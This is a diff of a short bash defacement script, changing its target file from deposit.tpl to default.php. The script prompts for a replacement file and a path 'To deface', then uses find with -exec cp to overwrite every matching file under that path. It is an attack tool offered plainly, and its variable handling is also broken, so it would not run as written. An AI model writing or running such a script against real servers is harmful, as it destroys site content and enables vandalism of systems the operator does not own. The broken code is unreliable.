@@ -1,11 +1,11 @@
 #!/bin/bash
-echo '[+] your deposit.tpl path on the server'
-read deposit.tpl 
+echo '[+] your default.php path on the server'
+read default.php 
 echo
 echo '[+] enter the path To deface '
 read path
 echo
 echo '[+] Starting ........'
-find $path -name "deposit.tpl.*" -exec cp $deposit.tpl {} \;
+find $path -name "default.php.*" -exec cp $default.php {} \;
 echo 
 echo '[+] Done !'
